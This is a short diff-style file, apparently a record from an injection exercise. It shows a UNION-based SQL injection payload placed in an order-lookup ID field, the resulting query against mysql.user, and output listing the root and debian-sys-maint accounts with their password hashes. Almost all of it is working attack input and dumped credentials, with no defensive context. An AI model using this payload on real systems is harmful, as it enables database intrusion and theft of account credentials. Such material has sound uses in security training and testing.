@@ -1,0 +1,10 @@
+SELECT * FROM orders WHERE orders.user_id = '' UNION SELECT 1,2,3,4, user, password, 7, 8 FROM mysql.user#''
+
+ID: ' UNION SELECT 1,2,3,4, user, password, 7, 8 FROM mysql.user#'
+Username: 
+First name: 
+Last name: 
+
+Order No 	Product No 	Product Name 	Price ($)
+root	*9CFBBC772F3F6C106020035386DA5BBBF1249A11	7	8
+debian-sys-maint	*BB58494DEAB17093AAB39290AEE928C758EBFA2D	7	8
